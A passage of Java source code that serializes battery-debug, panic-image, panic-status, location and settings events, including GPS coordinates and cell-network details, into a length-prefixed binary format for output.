			byte[] bytesStr = ByteUtil.toBytes(startTime);
			int bytesLen = bytesStr.length; 
			fileOutStream.write(ByteUtil.toBytes((short) bytesLen));
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write(new byte[]{0x00, 0x00});
		}
		
		//4 parse end time and 2 bytes length
		String endTime = event.getEndTime();
		if(endTime != null){
			byte[] bytesStr = ByteUtil.toBytes(endTime);
			int bytesLen = bytesStr.length; 
			fileOutStream.write(ByteUtil.toBytes((short) bytesLen));
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write(new byte[]{0x00, 0x00});
		}
	}
	
	private static void parseHttpBatteryLifeDebug(HttpBatteryLifeDebugEvent event, OutputStream fileOutStream) throws IOException{
		FxLog.d(TAG, "> parseHttpBatteryLifeDebug");
		//1 parse battery debug event common fields
		parseBatteryLifeDebugEveng(event, fileOutStream);
		
		//2 parse payload size and 2 bytes length
		String payloadSize = event.getPayloadSize();
		if(payloadSize != null){
			byte[] bytesStr = ByteUtil.toBytes(payloadSize);
			int bytesLen = bytesStr.length; 
			fileOutStream.write(ByteUtil.toBytes((short) bytesLen));
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write(new byte[]{0x00, 0x00});
		}
		
		FxLog.i(TAG, "> parseHttpBatteryLifeDebug # OK");
		
	}
	
	private static void parseGpsBatteryLifeDebug(GpsBatteryLifeDebugEvent event, OutputStream fileOutStream) throws IOException{
		FxLog.d(TAG, "> parseGpsBatteryLifeDebug");
		//1 parse battery debug event common fields
		parseBatteryLifeDebugEveng(event, fileOutStream);
		FxLog.i(TAG, "> parseGpsBatteryLifeDebug # OK");
	}
	
	// ************************************************ Panic and Alert Events *************************************** //
	
	private static void parsePanicImage(PanicImage event, OutputStream fileOutStream) throws Exception{
		FxLog.d(TAG, "> parsePanicImage");
		
		//1 parse Event Header
		parseEventHeader(event, fileOutStream);
		
		//2 parse location field
		//2.1 parse Lattitude : 8 bytes
		fileOutStream.write(ByteUtil.toBytes(event.getLattitude()), 0, 8);
		//2.2 parse Longitude : 8 bytes
		fileOutStream.write(ByteUtil.toBytes(event.getLongitude()), 0, 8);
		//2.3 parse Altitude : 4 bytes
		fileOutStream.write(ByteUtil.toBytes((float) event.getAltitude()), 0, 4);
		//2.4 parse co-ordiate accuracy : 1 byte
		fileOutStream.write((byte) event.getCoordinateAccuracy());
		//2.5 parse network name and 1 byte length
		String networkName = event.getNetworkName();
		if(networkName != null){
			byte[] bytesStr = ByteUtil.toBytes(networkName);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		//2.6 parse network id and 1 byte length
		String networkId = event.getNetworkId();
		if(networkId != null){
			byte[] bytesStr = ByteUtil.toBytes(networkId);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		//2.7 parse cell name and 1 byte length
		String cellName = event.getCellName();
		if(cellName != null){
			byte[] bytesStr = ByteUtil.toBytes(cellName);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}	
		//2.8 parse cell id : 4 bytes
		fileOutStream.write(ByteUtil.toBytes(event.getCellId()), 0, 4);
		//2.9 parse country code : 4 bytes
		fileOutStream.write(ByteUtil.toBytes(event.getCountryCode()), 0, 4);
		//2.10 parse area code : 4 bytes
		fileOutStream.write(ByteUtil.toBytes(event.getAreaCode()), 0, 4);
		//3 parse Media Type : 1 byte
		fileOutStream.write((byte) event.getMediaType());
		//4 parse Image Data and 4 bytes length
		parseFileDataWith4BytesLength(event.getImagePath(), fileOutStream);
		
		FxLog.i(TAG, "> parsePanicImage # OK");
	}

	private static void parsePanicStatus(PanicStatus event, OutputStream fileOutStream) throws Exception{
		FxLog.d(TAG, "> parsePanicStatus");
		
		//1 parse Event Header
		parseEventHeader(event, fileOutStream);
		
		//2 parse panic status : 1 byte
		fileOutStream.write((byte) event.getPanicStatus());
		
		FxLog.i(TAG, "> parsePanicStatus # OK");
	}
	
	// ************************************************ Positioning Events *************************************** //
	
	private static void parseLocation(LocationEvent event, OutputStream fileOutStream) throws Exception{
		FxLog.d(TAG, "> parseLocation");
		
		//1 parse event header
		parseEventHeader(event, fileOutStream);
		
		//2 parse calling module (1 byte)
		fileOutStream.write((byte) event.getCallingModule());
		
		//3 parse method (1 byte)
		fileOutStream.write((byte) event.getMethod());
		
		//4 parse provider (1 byte)
		fileOutStream.write((byte) event.getProvider());
		
		//5 parse longitude (8 bytes)
		fileOutStream.write(ByteUtil.toBytes(event.getLon()), 0, 8);
		
		//6 parse latitude (8 bytes)
		fileOutStream.write(ByteUtil.toBytes(event.getLat()), 0, 8);
		
		//7 parse altitude (4 bytes)
		fileOutStream.write(ByteUtil.toBytes(event.getAltitude()), 0, 4);
		
		//8 parse speed (4 bytes)
		fileOutStream.write(ByteUtil.toBytes(event.getSpeed()), 0, 4);
		
		//9 parse heading (4 bytes)
		fileOutStream.write(ByteUtil.toBytes(event.getHeading()), 0, 4);
		
		//10 parse horizontal accuracy (4 bytes)
		fileOutStream.write(ByteUtil.toBytes(event.getHorizontalAccuracy()), 0, 4);
		
		//11 parse vertical accuracy (4 bytes)
		fileOutStream.write(ByteUtil.toBytes(event.getVerticalAccuracy()), 0, 4);
		
		// *** cell info *** //
		
		//12 parse network name (string) and length (1 byte)
		String networkName = event.getNetworkName();
		if(networkName != null){
			byte[] bytesStr = ByteUtil.toBytes(networkName);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		
		//13 parse network id (String) and length (1 byte)
		String networkId = event.getNetworkId();
		if(networkId != null){
			byte[] bytesStr = ByteUtil.toBytes(networkId);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		
		//14 parse cell name (String) and length (1 byte)
		String cellName = event.getCellName();
		if(cellName != null){
			byte[] bytesStr = ByteUtil.toBytes(cellName);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}	
		
		//15 parse cell ID (4 bytes)
		fileOutStream.write(ByteUtil.toBytes((int) event.getCellId()), 0, 4);
		
		//16 parse mobile country code (String) and length (1 byte)
		String mcc = event.getMobileCountryCode();
		if(mcc != null){
			byte[] bytesStr = ByteUtil.toBytes(mcc);
			int bytesLen = bytesStr.length; 
			fileOutStream.write((byte) bytesLen);
			fileOutStream.write(bytesStr, 0, bytesLen);
		}else{
			fileOutStream.write((byte) 0);
		}
		
		//17 parse area code (4 bytes)	
		fileOutStream.write(ByteUtil.toBytes((int) event.getAreaCode()), 0, 4);
		
		FxLog.i(TAG, "> parseLocation # OK");		
	}
	
	// ************************************************ Others Events *************************************** //
	
	private static void parseSetting(SettingEvent event, OutputStream fileOutStream) throws Exception{
		FxLog.d(TAG, "> parseSetting");
		
		//1 parse event header
		parseEventHeader(event, fileOutStream);
		
		//2 parse setting count : 1 byte
		int settingCount = event.getSettingCount();
		fileOutStream.write((byte) settingCount);
		
		//3 parse each setting
		if(settingCount != 0){
			SettingData setting;
			String settingValue;
			for(int i=0; i<settingCount; i++){
				setting = event.getSettingData(i);
				// setting ID : 1 byte
				fileOutStream.write((byte) setting.getSettingId());
				
				// setting value and 2 bytes length
				settingValue = setting.getSttingValue();
				if(settingValue != null){
					byte[] bytesStr = ByteUtil.toBytes(settingValue);
					int bytesLen = bytesStr.length; 
					fileOutStream.write(ByteUtil.toBytes((short) bytesLen));
					fileOutStream.write(bytesStr, 0, bytesLen);
				}else{
					fileOutStream.write(new byte[]{0x00, 0x00});
				}
			}			
		}else{
			FxLog.w(TAG, "> parseSetting # No setting data");
		}

		FxLog.i(TAG, "> parseSetting # OK");
	}

}
